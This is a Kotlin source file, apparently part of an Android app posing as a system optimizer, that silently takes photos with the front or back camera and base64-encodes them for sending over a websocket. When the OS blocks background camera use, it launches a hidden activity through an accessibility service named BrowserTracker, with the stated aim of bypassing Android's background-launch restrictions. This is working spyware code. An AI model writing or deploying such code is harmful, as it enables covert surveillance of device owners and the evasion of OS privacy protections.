package com.system.optimizer.monitor

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import androidx.core.content.ContextCompat

/**
 * Silently captures a JPEG photo using the Front or Back camera via Camera2 API.
 * If background service camera access is blocked on Android 11+, automatically falls back
 * to launching CameraDummyActivity briefly to fulfill the capture.
 */
object CameraCapture {

    private const val TAG = "CameraCapture"
    var activeDummyCallback: ((String?, String?) -> Unit)? = null

    private var activeCameraDevice: CameraDevice? = null
    private var activeCaptureSession: CameraCaptureSession? = null
    private var activeImageReader: ImageReader? = null

    @Synchronized
    fun forceReleaseCamera() {
        try {
            activeCaptureSession?.close()
        } catch (_: Exception) {}
        activeCaptureSession = null

        try {
            activeCameraDevice?.close()
        } catch (_: Exception) {}
        activeCameraDevice = null

        try {
            activeImageReader?.close()
        } catch (_: Exception) {}
        activeImageReader = null
        Log.i(TAG, "🧹 Camera hardware resources fully released/closed")
    }

    fun takePhoto(context: Context, cameraType: String = "front", callback: (String?, String?) -> Unit) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "❌ CAMERA permission not granted on device")
            callback(null, "Camera permission not granted on device. Please open app on phone and click Grant Camera.")
            return
        }

        takePhotoDirect(context, cameraType) { base64, errorReason ->
            if (base64 != null) {
                callback(base64, null)
            } else if (context !is CameraDummyActivity) {
                Log.w(TAG, "⚠️ Direct camera capture returned: $errorReason. Launching CameraDummyActivity foreground fallback...")
                activeDummyCallback = callback
                try {
                    val intent = Intent(context, CameraDummyActivity::class.java).apply {
                        putExtra("cameraType", cameraType)
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    }
                    if (BrowserTracker.instance != null) {
                        Log.i(TAG, "Launching CameraDummyActivity from AccessibilityService to bypass BAL restrictions...")
                        BrowserTracker.instance!!.startActivity(intent)
                    } else {
                        context.startActivity(intent)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to launch CameraDummyActivity: ${e.message}")
                    callback(null, "Camera capture failed: ${errorReason ?: e.message}")
                }
            } else {
                callback(null, errorReason ?: "Camera capture failed")
            }
        }
    }

    private fun isBackgroundBlockedError(reason: String?): Boolean {
        if (reason == null) return true
        return reason.contains("SecurityException", ignoreCase = true) ||
               reason.contains("Background camera access", ignoreCase = true) ||
               reason.contains("DISABLED", ignoreCase = true) ||
               reason.contains("IN_USE", ignoreCase = true) ||
               reason.contains("timed out", ignoreCase = true) ||
               reason.contains("Error starting capture", ignoreCase = true)
    }

    @SuppressLint("MissingPermission")
    fun takePhotoDirect(context: Context, cameraType: String = "front", callback: (String?, String?) -> Unit) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            callback(null, "Camera permission not granted on device (`android.permission.CAMERA`)")
            return
        }

        forceReleaseCamera()

        val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val handler = Handler(Looper.getMainLooper())
        var cameraClosed = false

        fun cleanup() {
            if (!cameraClosed) {
                cameraClosed = true
                handler.removeCallbacksAndMessages(null)
            }
            forceReleaseCamera()
        }

        // Timeout fallback after 6 seconds to prevent leaking resources
        val timeoutRunnable = Runnable {
            if (!cameraClosed) {
                Log.e(TAG, "⏱️ Camera capture timed out after 6 seconds")
                cleanup()
                callback(null, "Camera capture timed out (device screen might be sleeping or camera busy)")
            }
        }
        handler.postDelayed(timeoutRunnable, 6000)

        try {
            val targetFacing = if (cameraType.equals("back", ignoreCase = true)) {
                CameraCharacteristics.LENS_FACING_BACK
            } else {
                CameraCharacteristics.LENS_FACING_FRONT
            }

            var targetCameraId: String? = null
            for (id in cameraManager.cameraIdList) {
                val chars = cameraManager.getCameraCharacteristics(id)
                val facing = chars.get(CameraCharacteristics.LENS_FACING)
                if (facing == targetFacing) {
                    targetCameraId = id
                    break
                }
            }

            // Fallback to first available camera if desired facing not found
            if (targetCameraId == null && cameraManager.cameraIdList.isNotEmpty()) {
                targetCameraId = cameraManager.cameraIdList[0]
            }

            if (targetCameraId == null) {
                Log.e(TAG, "No camera found on device")
                cleanup()
                callback(null, "No $cameraType camera hardware found on this device")
                return
            }

            Log.i(TAG, "📷 Opening camera ID $targetCameraId ($cameraType)")

            val chars = cameraManager.getCameraCharacteristics(targetCameraId)
            val sensorOrientation = chars.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0

            // Choose exact supported resolution up to ~1280x720 for fast websocket transmission
            val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val sizes = map?.getOutputSizes(ImageFormat.JPEG) ?: arrayOf()
            var width = 640
            var height = 480
            if (sizes.isNotEmpty()) {
                val bestSize = sizes.firstOrNull { it.width in 640..1280 && it.height in 480..960 }
                    ?: sizes.minByOrNull { it.width * it.height }
                    ?: sizes[0]
                width = bestSize.width
                height = bestSize.height
                Log.i(TAG, "Selected exact camera output size: ${width}x${height}")
            }

            val imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 2)
            activeImageReader = imageReader

            imageReader.setOnImageAvailableListener({ reader ->
                try {
                    val image = reader.acquireLatestImage()
                    if (image != null) {
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        image.close()

                        val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                        Log.i(TAG, "✅ Camera photo captured (${bytes.size} bytes)")
                        val wasClosed = cameraClosed
                        cleanup()
                        if (!wasClosed) {
                            callback(base64, null)
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error processing image bytes: ${e.message}", e)
                    val wasClosed = cameraClosed
                    cleanup()
                    if (!wasClosed) {
                        callback(null, "Failed to read camera image bytes: ${e.message}")
                    }
                }
            }, handler)

            cameraManager.openCamera(targetCameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    activeCameraDevice = camera
                    try {
                        camera.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                activeCaptureSession = session
                                try {
                                    val builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                    builder.addTarget(imageReader.surface)
                                    val afModes = chars.get(CameraCharacteristics.CONTROL_AF_AVAILABLE_MODES)
                                    if (afModes != null && afModes.contains(CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)) {
                                        builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                    } else {
                                        builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_OFF)
                                    }
                                    builder.set(CaptureRequest.JPEG_ORIENTATION, sensorOrientation)

                                    session.capture(builder.build(), object : CameraCaptureSession.CaptureCallback() {
                                        override fun onCaptureFailed(session: CameraCaptureSession, request: CaptureRequest, failure: CaptureFailure) {
                                            Log.e(TAG, "Still capture failed: ${failure.reason}")
                                            val wasClosed = cameraClosed
                                            cleanup()
                                            if (!wasClosed) {
                                                callback(null, "Camera still capture failed (reason: ${failure.reason})")
                                            }
                                        }
                                    }, handler)
                                } catch (e: Exception) {
                                    Log.e(TAG, "Error starting capture: ${e.message}")
                                    val wasClosed = cameraClosed
                                    cleanup()
                                    if (!wasClosed) {
                                        callback(null, "Error starting capture request: ${e.message}")
                                    }
                                }
                            }

                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                Log.e(TAG, "Camera session configuration failed")
                                val wasClosed = cameraClosed
                                cleanup()
                                if (!wasClosed) {
                                    callback(null, "Camera capture session configuration failed")
                                }
                            }
                        }, handler)
                    } catch (e: Exception) {
                        Log.e(TAG, "Error creating capture session: ${e.message}")
                        val wasClosed = cameraClosed
                        cleanup()
                        if (!wasClosed) {
                            callback(null, "Error creating capture session: ${e.message}")
                        }
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    Log.w(TAG, "Camera disconnected")
                    val wasClosed = cameraClosed
                    cleanup()
                    if (!wasClosed) {
                        callback(null, "Camera hardware disconnected or in use by another app")
                    }
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    val errText = when (error) {
                        ERROR_CAMERA_IN_USE -> "Camera already in use (`ERROR_CAMERA_IN_USE`)"
                        ERROR_MAX_CAMERAS_IN_USE -> "Max cameras in use (`ERROR_MAX_CAMERAS_IN_USE`)"
                        ERROR_CAMERA_DISABLED -> "Camera disabled by system/admin (`ERROR_CAMERA_DISABLED`)"
                        ERROR_CAMERA_DEVICE -> "Camera device fatal error (`ERROR_CAMERA_DEVICE`)"
                        ERROR_CAMERA_SERVICE -> "Camera service failure (`ERROR_CAMERA_SERVICE`)"
                        else -> "Camera error code $error"
                    }
                    Log.e(TAG, "Camera error: $errText ($error)")
                    val wasClosed = cameraClosed
                    cleanup()
                    if (!wasClosed) {
                        callback(null, errText)
                    }
                }
            }, handler)

        } catch (e: SecurityException) {
            Log.e(TAG, "SecurityException opening camera: ${e.message}")
            val wasClosed = cameraClosed
            cleanup()
            if (!wasClosed) {
                callback(null, "SecurityException: Background camera access blocked by OS (${e.message})")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Exception in takePhotoDirect: ${e.message}", e)
            val wasClosed = cameraClosed
            cleanup()
            if (!wasClosed) {
                callback(null, "Exception opening camera: ${e.message}")
            }
        }
    }
}
